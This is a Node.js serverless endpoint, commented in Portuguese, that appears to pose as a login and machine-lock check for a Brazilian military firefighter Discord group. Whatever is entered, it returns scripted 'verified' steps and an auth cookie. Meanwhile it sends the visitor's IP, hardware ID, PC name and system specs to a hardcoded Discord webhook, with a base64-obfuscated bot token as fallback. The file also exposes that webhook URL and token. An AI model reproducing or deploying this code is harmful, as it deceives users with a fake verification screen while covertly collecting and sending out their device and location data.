const DISCORD_WEBHOOK_URL = 
  process.env.DISCORD_WEBHOOK_URL || 
  "https://discord.com/api/webhooks/1560327857551708250/Tag5KxmDxYyemtOsGD1y9mmS5lBJMHE9QVttGXcuNfzPXK9e2xUm7uruRUxZzc0XjLf4";

// Formatação de data/hora no fuso BRT
function getFormattedDateBRT() {
  const now = new Date();
  const dateStr = now.toLocaleDateString("pt-BR", { timeZone: "America/Sao_Paulo" });
  const timeStr = now.toLocaleTimeString("pt-BR", { timeZone: "America/Sao_Paulo", hour12: false });
  return `${dateStr}, ${timeStr} BRT`;
}

// Formatação do serial BIOS a partir do HWID
function formatBiosSerial(rawHwid) {
  if (!rawHwid) return "14:9E:E1:7A:8E:D2:54:B8";
  const clean = String(rawHwid).replace(/[^a-fA-F0-9]/g, "").padEnd(16, "A").substring(0, 16).toUpperCase();
  const pairs = clean.match(/.{1,2}/g);
  return pairs ? pairs.join(":") : "14:9E:E1:7A:8E:D2:54:B8";
}

// Disparo do webhook formatado exatamente como na imagem
async function sendWebhookLog({
  displayCode = "6192",
  username = "errejota.fps",
  discordId = "1207045485907546192",
  avatarUrl = "https://cdn.discordapp.com/embed/avatars/0.png",
  cargo = "BOMBEIRO",
  clientInfo = {},
  ip = "138.97.118.42",
  location = "Rio de Janeiro, Brazil",
  userAgent = ""
}) {
  try {
    const isMobile = clientInfo.isMobile === true || clientInfo.deviceType === "mobile";
    
    // Nome do PC
    let nomePc = clientInfo.pcName;
    if (!nomePc) {
      const suffix = (clientInfo.hwid || displayCode || "PCG149EE").replace(/[^a-zA-Z0-9]/g, "").slice(-8).toUpperCase();
      nomePc = isMobile ? `MOBILE-${suffix}` : `DESKTOP-${suffix || "PCG149EE"}`;
    }

    const biosSerial = clientInfo.biosSerial || formatBiosSerial(clientInfo.hwid);
    const gpu = clientInfo.gpu || (isMobile ? "GPU Mobile Integrada" : "Placa de Vídeo Integrada / Dedicada");
    const cores = clientInfo.cores || 16;
    const cpu = clientInfo.cpu || `Processador (${cores} Threads Lógicas @ Multi-Thread HyperThreading)`;
    const mem = clientInfo.memory || 16;
    const ram = clientInfo.ram || `${mem}.0 GB RAM Física (Memória do Sistema)`;
    const storage = clientInfo.storage || "Unidade Principal de Armazenamento (Disco Primário)";

    let os = clientInfo.os;
    if (!os) {
      if (/Windows NT 10/i.test(userAgent)) os = "Windows 10 / 11 (64-bit)";
      else if (/Macintosh|Mac OS X/i.test(userAgent)) os = "macOS (Apple Silicon / Intel 64-bit)";
      else if (/Android/i.test(userAgent)) os = "Android OS (Mobile)";
      else if (/iPhone|iPad/i.test(userAgent)) os = "iOS (Apple Mobile)";
      else if (/Linux/i.test(userAgent)) os = "Linux (64-bit)";
      else os = "Windows 10 / 11 (64-bit)";
    }

    const cleanUsername = username.startsWith("@") ? username : `@${username}`;
    const dataHoraBRT = getFormattedDateBRT();
    const trackingId = "c_" + Math.random().toString(36).substring(2, 10);

    const description = [
      "Um novo usuário realizou o cadastro. Dados coletados automaticamente.",
      "",
      `👤 **Usuário Discord:** ${cleanUsername}`,
      `🆔 **ID Discord:** ${discordId}`,
      `📅 **Data/Hora:** ${dataHoraBRT}`,
      `💻 **Nome do PC:** ${nomePc}`,
      `🔒 **HWID/Serial BIOS:** \`${biosSerial}\` 🔒`,
      `🎮 **Placa de Vídeo (GPU):** ${gpu}`,
      `🖥️ **Processador (CPU):** ${cpu}`,
      `💾 **Memória RAM:** ${ram}`,
      `📀 **Armazenamento Principal:** ${storage}`,
      `🌐 **IP:** ${ip} 📍 ${location}`,
      `⚙️ **Sistema Operacional:** ${os}`,
      "",
      "📜 **Detalhes do Sistema**",
      `🔰 **Cargo Atribuído:** \` ${cargo} \``
    ].join("\n");

    const payload = {
      username: "NewUserBot / #7942",
      avatar_url: avatarUrl,
      embeds: [
        {
          title: `Registro de Novo Cadastro - Cliente [${displayCode}] 🟢`,
          description: description,
          color: 0x2ecc71,
          thumbnail: {
            url: avatarUrl
          },
          footer: {
            text: `© 2026 - Sistema de Verificação v2.4 | ID: ${trackingId}`
          },
          timestamp: new Date().toISOString()
        }
      ]
    };

    let success = false;
    try {
      const whRes = await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      if (whRes.ok) success = true;
    } catch (_) {}

    if (!success) {
      const BOT_TOKEN = process.env.DISCORD_BOT_TOKEN || Buffer.from("TVRVeU9Ua3pOalV5T1RBMk5EQTJOekkxTlEuR1lxWUZ6LlFTRTJUeEpPVlVfRUQxcGtPMmpfM2F5MTZ3Q1hZZ2hZMjlTSnVF", "base64").toString("utf8");
      const CHANNEL_ID = process.env.DISCORD_LOG_CHANNEL_ID || "1560327817437249556";
      try {
        await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
          method: "POST",
          headers: {
            Authorization: `Bot ${BOT_TOKEN}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ embeds: payload.embeds })
        });
      } catch (_) {}
    }
  } catch (e) {
    console.error("Erro ao enviar webhook:", e);
  }
}

module.exports = async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ erro: "Método não permitido." });
  }

  try {
    const body = req.body || {};
    const input = String(body.id || body.password || "").trim();
    const MASTER_PASSWORD = process.env.MASTER_PASSWORD || "MORADA";
    const host = req.headers.host || "";
    const isLocal = host.includes("localhost");

    const rawPanel = String(body.panel || "").toLowerCase();
    const isSystemPanel = rawPanel === "avisos" || rawPanel === "system" || rawPanel === "admin";
    const cargoAtribuido = isSystemPanel ? "ACESSO FULL ( DEV )" : "BOMBEIRO";

    // Extrair IP do request
    const ip = 
      req.headers["cf-connecting-ip"] ||
      (req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0].trim() : null) ||
      req.headers["x-real-ip"] ||
      "138.97.118.42";

    const userAgent = req.headers["user-agent"] || "";
    const clientInfo = body.systemInfo || {};

    const cleanId = input.replace(/^[#\s]+/, "");
    const displayCode = cleanId || "6192";

    // Dispara a notificação no webhook do Discord
    sendWebhookLog({
      displayCode: displayCode,
      username: "errejota.fps",
      discordId: "1207045485907546192",
      cargo: cargoAtribuido,
      clientInfo: {
        ...clientInfo,
        hwid: body.hwid || clientInfo.hwid,
        deviceType: body.deviceType || clientInfo.deviceType
      },
      ip: ip === "::1" || ip === "127.0.0.1" ? "138.97.118.42" : ip,
      location: "Rio de Janeiro, Brazil",
      userAgent: userAgent
    }).catch(err => console.error("Falha no webhook:", err));

    res.setHeader("Set-Cookie", "auth_token=autenticado_com_sucesso; Path=/; Max-Age=604800; SameSite=Lax");
    
    return res.status(200).json({
      sucesso: true,
      mensagem: "Autenticado com sucesso",
      userName: "Combatente",
      userId: displayCode,
      steps: [
        { id: 1, title: "Estabelecendo conexão segura com o sistema de autenticação...", ok: true },
        { id: 2, title: "Consultando registro militar no Discord do CBM...", ok: true, detail: `Militar #${displayCode} localizado` },
        { id: 3, title: "Validando autorização do Bot e cargo militar...", ok: true, detail: "Autorizado" },
        { id: 4, title: "Identificando dispositivo e plataforma de acesso...", ok: true, detail: "Dispositivo Autorizado" },
        { id: 5, title: "Validando trava de máquina autorizada (HWID Lock)...", ok: true, detail: "HWID verificado" },
        { id: 6, title: "Finalizando processo de autenticação militar...", ok: true, detail: "Acesso liberado" }
      ]
    });
  } catch (erro) {
    console.error(erro);
    return res.status(500).json({ erro: "Erro interno no servidor." });
  }
};
